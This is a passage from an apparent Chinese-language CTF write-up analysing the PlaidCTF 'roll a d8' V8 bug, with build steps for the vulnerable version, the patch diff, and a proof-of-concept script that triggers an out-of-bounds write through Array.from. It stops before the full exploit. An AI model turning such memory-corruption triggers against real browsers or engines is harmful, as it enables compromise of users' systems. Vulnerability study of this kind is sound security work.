#### 前言:

之前花了一段时间学习解释器原理，然后开始学习js引擎的利用.分析一下plaidctf中的roll a d8，虽说是ctf题，但是是真实的漏洞.
主要参考了以下文章:

[v8 exploit入门 PlaidCTF roll a d8](https://xz.aliyun.com/t/5190)

p4nda师傅的[Plaid CTF 2018 roll a d8](https://github.com/ret2p4nda/browser-pwn/tree/master/roll%20a%20d8)

[扔个骰子学v8 - 从Plaid CTF roll a d8开始](https://www.anquanke.com/post/id/147829#h3-12)

#### 环境搭建:

最好科学上网,或者在国外服务器上编译好然后打包拷到本地.
题目给了 issue: https://crbug.com/821137 , 找到修复漏洞的commit，然后将版本回退到打补丁之前.
```
cd v8
git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599
cd ..
gclient sync
cd v8
```
编译release版本:
```
tools/dev/v8gen.py x64.release
ninja -C out.gn/x64.release d8
```
这里在编译参数`args.gn`中加上了:`v8_enable_object_print = true`，但编译出来的release版本仍然不能用job,v8print等...,可能是版本问题吧，调试起来不方便，于是又编译了debug版本，方便使用job，v8print等查看对象布局:
```
tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug d8
```
不使用debug版本直接写exp的原因是debug版本中有DCHECK.

#### patch分析:

```
@@ -1945,10 +1945,13 @@
   void GenerateSetLength(TNode<Context> context, TNode<Object> array,
                          TNode<Number> length) {
     Label fast(this), runtime(this), done(this);
+    // TODO(delphick): We should be able to skip the fast set altogether, if the
+    // length already equals the expected length, which it always is now on the
+    // fast path.
     // Only set the length in this stub if
     // 1) the array has fast elements,
     // 2) the length is writable,
-    // 3) the new length is greater than or equal to the old length.
+    // 3) the new length is equal to the old length.
 
     // 1) Check that the array has fast elements.
     // TODO(delphick): Consider changing this since it does an an unnecessary
@@ -1970,10 +1973,10 @@
       // BranchIfFastJSArray above.
       EnsureArrayLengthWritable(LoadMap(fast_array), &runtime);
 
-      // 3) If the created array already has a length greater than required,
+      // 3) If the created array's length does not match the required length,
       //    then use the runtime to set the property as that will insert holes
-      //    into the excess elements and/or shrink the backing store.
-      GotoIf(SmiLessThan(length_smi, old_length), &runtime);
+      //    into excess elements or shrink the backing store as appropriate.
+      GotoIf(SmiNotEqual(length_smi, old_length), &runtime);
 
       StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,
                                      length_smi);
``` 

这里的builtin函数是使用CodeStubAssembler写的，关于如何写CodeStubAssembler builtin可以参考官网文档 https://v8.dev/docs/csa-builtins 


这里将`GotoIf(SmiLessThan(length_smi, old_length), &runtime);`修改为了`GotoIf(SmiNotEqual(length_smi, old_length), &runtime);`
通过注释可以知道: 如果 length_smi小于old_length，则跳转到runtime，进行array的收缩。否者不跳转，执行`StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,length_smi);` 将array的length设置为length_smi,这里的length_smi是迭代的次数，old_length是array原来的长度.

而patch将逻辑修改为 length_smi 不等于 old_length 则跳转到runtime.说明之前的逻辑在 length_smi大于 old_length 时存在问题，如果大于，则不会跳转到`runtime`,会去执行
`StoreObjectFieldNoWriteBarrier`,将array的长度设置为更大的length_smi.

#### poc分析:

```
+// Tests that creating an iterator that shrinks the array populated by
+// Array.from does not lead to out of bounds writes.
+let oobArray = [];
+let maxSize = 1028 * 8;
+Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => (
+  {
+    counter : 0,
+    next() {
+      let result = this.counter++;
+      if (this.counter > maxSize) {
+        oobArray.length = 0;
+        return {done: true};
+      } else {
+        return {value: result, done: false};
+      }
+    }
+  }
+) });
+assertEquals(oobArray.length, maxSize);
+
+// iterator reset the length to 0 just before returning done, so this will crash
+// if the backing store was not resized correctly.
+oobArray[oobArray.length - 1] = 0x41414141;
```
Array.from函数的用途可以查看: [Array.from()](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/from)

> Array.from() 方法从一个类似数组或可迭代对象中创建一个新的，浅拷贝的数组实例。

在debug版本运行该poc，v8就会挂掉:
```
wxy@ubuntu:/mnt/hgfs/vmshare/js_exp/v8/out.gn/x64.debug$ ./d8 poc.js 
#
# Fatal error in ../../src/objects/fixed-array-inl.h, line 96
# Debug check failed: index < this->length() (8223 vs. 0).
#
#
#
#FailureMessage Object: 0x7ffe999d87a0
```

从DCHECK可以看到是越界访问了.

poc在迭代的最后一次将oobArray的length设置为0，注意call方法可以改变被调用函数中的this指针 ，这里将this指针修改为了 oobArray.

分析polyfill.js中from的js实现:
```
  define(
    Array, 'from',
    function from(items) {
      var mapfn = arguments[1];//获得map函数
      var thisArg = arguments[2];//获得map函数的this
      var c = strict(this);  //获得this
      if (mapfn === undefined) { //判断是否提供了map函数
        var mapping = false;
      } else {
        if (!IsCallable(mapfn)) throw TypeError();
        var t = thisArg;
        mapping = true;
      }
      var usingIterator = GetMethod(items, $$iterator);
      if (usingIterator !== undefined) {
         if (IsConstructor(c)) { //判断c是否是函数
          var a = new c(); //如果是函数则 new c();
        } else {
          a = new Array(0);
        }
		......
```
在poc中，使用call将this替换成了 function ，所以这里会调用 new c(), 而new一个函数对象时，如果函数return的是一个对象，则new得到的即是这个函数返回的对象,否者是函数对象本身.

关于的new的返回值可以参考[JS中new操作符与函数返回值return](https://blog.csdn.net/charking_gg/article/details/78027828)，则之后 a 即是oobArray.

知道from的实现逻辑后就可以看v8中from的实现了:










